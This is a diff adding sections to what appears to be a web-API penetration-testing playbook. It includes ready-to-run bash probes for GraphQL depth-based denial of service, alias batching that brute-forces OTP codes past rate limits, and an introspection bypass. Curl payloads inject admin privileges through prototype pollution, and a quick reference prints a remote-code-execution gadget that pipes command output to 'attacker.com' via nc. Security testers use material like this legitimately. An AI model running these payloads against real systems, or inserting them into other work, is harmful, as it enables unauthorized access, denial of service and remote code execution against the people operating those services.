@@ -351,7 +351,53 @@ curl -sk -X POST "$GRAPHQL_URL" \
     -H "Content-Type: application/json" \
     ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
     -d '{"query":"subscription { userCreated { id email } }"}' 2>/dev/null | head -5
-```
+
+echo ""
+echo "--- Query depth DoS (no depth limit = server OOM) ---"
+# Deeply nested query — each level multiplies resolver load
+DEPTH_QUERY='{ user(id:1) { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { id email } } } } } } } } } } } }'
+echo "Testing query depth=10 levels..."
+TIME_START=$(date +%s%3N)
+RESP=$(curl -sk -X POST "$GRAPHQL_URL" \
+    -H "Content-Type: application/json" \
+    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
+    -d "{\"query\":\"$DEPTH_QUERY\"}" 2>/dev/null)
+TIME_END=$(date +%s%3N)
+TIME_DIFF=$((TIME_END - TIME_START))
+echo "  Response time: ${TIME_DIFF}ms"
+echo "$RESP" | grep -qi "error\|Maximum\|depth\|limit\|timeout" && echo "  [DEPTH LIMIT EXISTS] $(echo $RESP | head -c 100)" || echo "  [NO DEPTH LIMIT DETECTED] — server accepted nested query in ${TIME_DIFF}ms"
+
+echo ""
+echo "--- Alias batching for rate limit bypass ---"
+# 100 aliases in ONE request = server processes 100 mutations, counts as 1 API request
+# Classic: brute-force OTP via 100 alias tries per request
+ALIAS_QUERY='{'
+for i in $(seq 1 20); do
+    # Generate 6-digit OTP guesses
+    OTP=$(printf "%06d" $((RANDOM % 999999)))
+    ALIAS_QUERY="${ALIAS_QUERY} a${i}: verifyOTP(code:\"${OTP}\") { success token }"
+done
+ALIAS_QUERY="${ALIAS_QUERY} }"
+RESULT=$(curl -sk -X POST "$GRAPHQL_URL" \
+    -H "Content-Type: application/json" \
+    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
+    -d "{\"query\":\"$ALIAS_QUERY\"}" 2>/dev/null)
+echo "$RESULT" | grep -qi "true\|token\|success" && \
+    echo "  [ALIAS BATCH HIT] OTP bypass or data returned: $(echo $RESULT | head -c 150)" || \
+    echo "  $(echo $RESULT | head -c 100)"
+echo "  Note: If verifyOTP/mutation exists and accepts batching, can brute 20×N codes per request bypassing per-request rate limits"
+
+echo ""
+echo "--- Introspection bypass: __type query (works when only __schema is blocked) ---"
+# Many apps disable __schema introspection but forget __type still works
+for typename in User Admin Account Order Product Token Session Permission Role; do
+    RESULT=$(curl -sk -X POST "$GRAPHQL_URL" \
+        -H "Content-Type: application/json" \
+        ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
+        -d "{\"query\":\"{ __type(name: \\\"$typename\\\") { name kind fields { name type { name kind ofType { name } } } } }\"}" 2>/dev/null)
+    echo "$RESULT" | grep -qi '"name"' && ! echo "$RESULT" | grep -qi '"name":null' && \
+        echo "  [__type HIT] $typename → $(echo $RESULT | python3 -m json.tool 2>/dev/null | grep '"name"' | head -5)"
+done
 
 ---
 
@@ -599,6 +645,105 @@ curl -sk -X POST "$BASE_URL/api/transfer" \
 ```
 
 **Impact gate**: Authentication bypass → **Critical**. Price manipulation (accepted as valid order) → **High**. Type confusion in non-auth context → **Medium** (depends on business impact).
+
+---
+
+### Phase 8c — Server-Side Prototype Pollution (Node.js / Express APIs)
+
+In Node.js apps, `Object.assign()`, `lodash.merge()`, `_.extend()`, and `JSON.parse` + property spread can merge attacker-controlled `__proto__` into the global Object prototype. Once polluted, every subsequent `{}` creation inherits the injected property — enabling privilege escalation, DoS, or gadget-chain RCE.
+
+```bash
+BASE_URL=<base_url>
+TOKEN=<token>
+
+echo "=== Server-Side Prototype Pollution ==="
+echo ""
+
+echo "--- Probe 1: JSON body __proto__ injection ---"
+# If server merges request body with Object.assign({}, userInput), we can inject
+RESULT=$(curl -sk -X POST "$BASE_URL/api/users/settings" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"__proto__":{"isAdmin":true,"role":"admin","status":200}}' 2>/dev/null)
+echo "  Response: $(echo $RESULT | head -c 200)"
+
+# Re-fetch profile — if prototype pollution worked, isAdmin will be true for all subsequent requests
+sleep 1
+PROFILE=$(curl -sk "$BASE_URL/api/me" \
+    -H "Authorization: Bearer $TOKEN" 2>/dev/null)
+echo "  Profile after inject: $(echo $PROFILE | python3 -c "import sys,json; d=json.load(sys.stdin); print('isAdmin=',d.get('isAdmin'), 'role=',d.get('role'))" 2>/dev/null)"
+
+echo ""
+echo "--- Probe 2: constructor.prototype path ---"
+RESULT=$(curl -sk -X POST "$BASE_URL/api/users/settings" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"constructor":{"prototype":{"isAdmin":true,"role":"admin"}}}' 2>/dev/null)
+echo "  Response: $(echo $RESULT | head -c 200)"
+
+echo ""
+echo "--- Probe 3: Query string pollution (GET requests with qs library) ---"
+# qs library: ?a[__proto__][isAdmin]=true → sets Object.prototype.isAdmin
+for endpoint in /api/users /api/profile /api/search /api/me; do
+    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
+        "$BASE_URL${endpoint}?__proto__[isAdmin]=true&__proto__[role]=admin" \
+        -H "Authorization: Bearer $TOKEN" 2>/dev/null)
+    echo "  GET $endpoint?__proto__[isAdmin]=true → $CODE"
+
+    CODE2=$(curl -sk -o /dev/null -w "%{http_code}" \
+        "$BASE_URL${endpoint}?constructor[prototype][isAdmin]=true" \
+        -H "Authorization: Bearer $TOKEN" 2>/dev/null)
+    echo "  GET $endpoint?constructor[prototype][isAdmin]=true → $CODE2"
+done
+
+echo ""
+echo "--- Probe 4: Cookie-based pollution ---"
+RESULT=$(curl -sk -X GET "$BASE_URL/api/me" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Cookie: __proto__[isAdmin]=true; constructor[prototype][role]=admin" 2>/dev/null)
+echo "  Response: $(echo $RESULT | head -c 200)"
+
+echo ""
+echo "--- Probe 5: Detect via status code gadget ---"
+# If Object.prototype.status is polluted to 200, endpoints that return 403 may flip
+ORIGINAL=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/api/admin/users" \
+    -H "Authorization: Bearer $TOKEN" 2>/dev/null)
+echo "  Baseline admin endpoint: $ORIGINAL"
+
+# Inject status=200 into prototype
+curl -sk -X POST "$BASE_URL/api/users/settings" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"__proto__":{"status":200}}' 2>/dev/null > /dev/null
+
+AFTER=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/api/admin/users" \
+    -H "Authorization: Bearer $TOKEN" 2>/dev/null)
+echo "  After prototype pollution (status=200): $AFTER"
+[ "$ORIGINAL" != "$AFTER" ] && echo "  [!!!] STATUS CODE CHANGED — prototype pollution confirmed" || \
+    echo "  No status code change (endpoint likely not Node.js or pollution not merging)"
+
+echo ""
+echo "--- Automated: use server-side-prototype-pollution scanner ---"
+# If npm package available
+which ppmap 2>/dev/null && \
+    ppmap --url "$BASE_URL/api/users/settings" --token "$TOKEN" || \
+    echo "ppmap not installed — manual probes above are the detection method"
+
+echo ""
+python3 << 'EOF'
+print("=== Prototype Pollution Quick Reference ===")
+print("Lodash < 4.17.17: _.merge({}, {\"__proto__\":{\"isAdmin\":true}})")
+print("Lodash < 4.17.17: _.set({}, \"__proto__.isAdmin\", true)")
+print("jQuery < 3.4.0: $.extend(true, {}, {\"__proto__\":{\"isAdmin\":true}})")
+print("qs < 6.3.2: qs.parse(\"__proto__[isAdmin]=true\")")
+print()
+print("Escalation gadgets (if pollution confirmed):")
+print("  {\"__proto__\":{\"outputFunctionName\":\"x;require('child_process').exec('id|nc attacker.com 4444');//\"}}")
+print("  (express-fileupload gadget — see snyk CVE-2020-7699)")
+EOF
+```
+
+**Impact gate**: Prototype pollution confirmed + RCE gadget found → **Critical**. Privilege escalation (isAdmin=true accepted) → **Critical**. Pollution confirmed but no gadget → **High** (DoS risk, potential future gadget).
 
 ---
 
